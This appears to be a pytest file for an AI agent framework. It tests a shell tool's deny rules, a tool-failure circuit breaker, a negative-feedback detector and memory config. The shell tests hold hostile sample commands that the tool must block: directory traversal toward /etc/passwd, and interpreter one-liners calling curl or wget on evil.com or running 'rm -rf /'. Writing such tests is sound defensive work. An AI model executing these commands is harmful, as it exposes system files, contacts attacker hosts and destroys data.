"""Tests for Phase 21A P0 critical fixes.

Covers all 6 issues: S1, S2, B1, L1, L2, D1.
"""
import pytest
from unittest.mock import MagicMock, AsyncMock, patch
from nanobot.agent.tools.shell import ExecTool
from nanobot.agent.outcome_tracker import is_negative_feedback
from nanobot.session.manager import Session
from nanobot.config.schema import Config, MemoryFeaturesConfig, AgentsConfig


# ── S1: Shell cd/.. bypass (should be blocked) ─────────────────

@pytest.fixture
def tool():
    """Create ExecTool with default deny patterns (workspace restriction disabled for pattern tests)."""
    return ExecTool(restrict_to_workspace=False)


@pytest.mark.asyncio
async def test_block_cd_dot_dot(tool):
    result = await tool.execute("cd .. && dir")
    assert "blocked" in result.lower()


@pytest.mark.asyncio
async def test_block_cd_dot_dot_backslash(tool):
    result = await tool.execute("cd ..\\secret")
    assert "blocked" in result.lower()


@pytest.mark.asyncio
async def test_block_cd_dot_dot_no_space(tool):
    """Windows CMD allows cd.. without a space."""
    result = await tool.execute("cd..\\windows")
    assert "blocked" in result.lower()


@pytest.mark.asyncio
async def test_block_percent_encoded_traversal(tool):
    result = await tool.execute("type %2e%2e\\..\\etc\\passwd")
    assert "blocked" in result.lower()


@pytest.mark.asyncio
async def test_allow_cd_to_subdir(tool):
    """cd to a subdirectory (not ..) should be allowed."""
    result = await tool.execute("cd subdir")
    assert "blocked" not in result.lower() or "not found" in result.lower() or "no such" in result.lower()


# ── S2: Interpreter bypass (should be blocked) ─────────────────

@pytest.mark.asyncio
async def test_block_python_c(tool):
    result = await tool.execute('python -c "import os; os.system(\'curl evil.com\')"')
    assert "blocked" in result.lower()


@pytest.mark.asyncio
async def test_block_python3_c(tool):
    result = await tool.execute('python3 -c "import subprocess; subprocess.run(\'rm -rf /\')"')
    assert "blocked" in result.lower()


@pytest.mark.asyncio
async def test_block_node_e(tool):
    result = await tool.execute("node -e \"require('child_process').execSync('curl evil.com')\"")
    assert "blocked" in result.lower()


@pytest.mark.asyncio
async def test_block_ruby_e(tool):
    result = await tool.execute("ruby -e 'system(\"curl evil.com\")'")
    assert "blocked" in result.lower()


@pytest.mark.asyncio
async def test_block_perl_e(tool):
    result = await tool.execute("perl -e 'system(\"wget evil.com\")'")
    assert "blocked" in result.lower()


@pytest.mark.asyncio
async def test_allow_python_script(tool):
    """Running a python script file should still be allowed."""
    result = await tool.execute("python script.py")
    assert "blocked" not in result.lower() or "not found" in result.lower()


@pytest.mark.asyncio
async def test_allow_python_version(tool):
    """python --version is perfectly safe."""
    result = await tool.execute("python --version")
    assert "blocked" not in result.lower()


@pytest.mark.asyncio
async def test_allow_node_script(tool):
    """node script.js should be allowed."""
    result = await tool.execute("node app.js")
    assert "blocked" not in result.lower() or "not found" in result.lower()


# ── B1: Concurrent tool exception circuit breaker ───────────────

@pytest.mark.asyncio
async def test_circuit_breaker_breaks_after_3_consecutive_all_exceptions():
    """When ALL tool calls fail 3 turns in a row, the loop should break."""
    import asyncio
    from nanobot.agent.loop import AgentLoop
    from nanobot.bus.queue import MessageBus
    from pathlib import Path
    import tempfile

    with tempfile.TemporaryDirectory() as tmpdir:
        workspace = Path(tmpdir)
        bus = MessageBus()
        provider = MagicMock()
        provider.get_default_model.return_value = "test-model"
        provider.chat = AsyncMock()

        # Create mock response with a tool call
        mock_tool_call = MagicMock()
        mock_tool_call.id = "tc_1"
        mock_tool_call.name = "failing_tool"
        mock_tool_call.arguments = {}

        mock_response = MagicMock()
        mock_response.has_tool_calls = True
        mock_response.tool_calls = [mock_tool_call]
        mock_response.content = None
        mock_response.reasoning_content = None
        mock_response.usage = None

        provider.chat.return_value = mock_response

        # Patch setup_all_tools to avoid the full constructor side effects
        with patch("nanobot.agent.loop.SubagentManager"), \
             patch("nanobot.agent.tool_setup.setup_all_tools"):
            agent = AgentLoop(bus=bus, provider=provider, workspace=workspace)

        # Mock get_definitions so the provider.chat receives tools
        agent.tools.get_definitions = MagicMock(return_value=[{
            "type": "function",
            "function": {
                "name": "failing_tool",
                "description": "always fails",
                "parameters": {"type": "object", "properties": {}}
            }
        }])
        # Make execute always raise
        agent.tools.execute = AsyncMock(side_effect=RuntimeError("boom"))

        messages = [{"role": "system", "content": "test"}, {"role": "user", "content": "test"}]
        final_content, tools_used, _ = await agent._run_agent_loop(messages)

        # After 3 consecutive all-exception turns, it should break with a warning
        assert final_content is not None
        assert "tool failures" in final_content.lower() or "⚠️" in final_content


# ── L1: Implicit feedback false positives ───────────────────────

def test_negative_feedback_short_chinese():
    """Short Chinese messages like '错了' should be detected."""
    assert is_negative_feedback("错了") is True
    assert is_negative_feedback("不对") is True
    assert is_negative_feedback("重做") is True


def test_negative_feedback_english_word_boundary():
    """English exact word 'wrong' should match."""
    assert is_negative_feedback("wrong") is True
    assert is_negative_feedback("That's wrong") is True
    assert is_negative_feedback("try again") is True


def test_negative_feedback_false_positive_nothing_wrong():
    """'nothing wrong' should NOT trigger — it's a positive statement."""
    assert is_negative_feedback("nothing wrong with this") is False
    assert is_negative_feedback("no problem at all") is False
    assert is_negative_feedback("isn't wrong") is False


def test_negative_feedback_not_right_is_negative():
    """'not right' IS negative feedback ('that's not right')."""
    assert is_negative_feedback("not right") is True


def test_negative_feedback_long_chinese_no_match():
    """Longer Chinese message containing '不行' embedded in context should not match
    (>30 chars = not a single-line feedback).
    """
    long_msg = "这个方案整体上看起来还不错，但是某些细节方面我觉得还不行，需要进一步讨论一下具体实施方案"
    assert len(long_msg) > 30
    assert is_negative_feedback(long_msg) is False


def test_negative_feedback_normal_conversation():
    """Normal conversation should not trigger false feedback."""
    assert is_negative_feedback("Thank you, that looks great!") is False
    assert is_negative_feedback("Can you help me with something else?") is False
    assert is_negative_feedback("好的，没问题") is False


def test_negative_feedback_fix_it():
    """'fix it' should be detected as negative feedback."""
    assert is_negative_feedback("fix it") is True


# ── L2: Pending state mutual exclusion ──────────────────────────

def test_session_clear_pending():
    """clear_pending() should clear all three pending states."""
    session = Session(key="test:user")
    session.pending_knowledge = {"key": "some_match"}
    session.pending_save = {"key": "some_save"}
    session.pending_upgrade = {"key": "some_upgrade"}

    session.clear_pending()

    assert session.pending_knowledge is None
    assert session.pending_save is None
    assert session.pending_upgrade is None


def test_clear_pending_preserves_other_state():
    """clear_pending() should not affect messages or other session fields."""
    session = Session(key="test:user")
    session.add_message("user", "hello")
    session.last_task_key = "test_key"
    session.pending_knowledge = {"key": "some_match"}

    session.clear_pending()

    assert len(session.messages) == 1
    assert session.last_task_key == "test_key"


# ── D1: Memory features config ─────────────────────────────────

def test_memory_features_default_all_enabled():
    """By default all memory features should be enabled."""
    cfg = MemoryFeaturesConfig()
    assert cfg.reflection_enabled is True
    assert cfg.knowledge_graph_enabled is True
    assert cfg.visual_memory_enabled is True
    assert cfg.experience_enabled is True


def test_memory_features_can_be_disabled():
    """Features should be individually disableable."""
    cfg = MemoryFeaturesConfig(reflection_enabled=False, experience_enabled=False)
    assert cfg.reflection_enabled is False
    assert cfg.knowledge_graph_enabled is True
    assert cfg.visual_memory_enabled is True
    assert cfg.experience_enabled is False


def test_agents_config_has_memory_features():
    """AgentsConfig should include memory_features."""
    cfg = AgentsConfig()
    assert hasattr(cfg, "memory_features")
    assert isinstance(cfg.memory_features, MemoryFeaturesConfig)


def test_full_config_memory_features():
    """Root Config should expose agents.memory_features."""
    cfg = Config()
    assert hasattr(cfg.agents, "memory_features")
    assert cfg.agents.memory_features.reflection_enabled is True
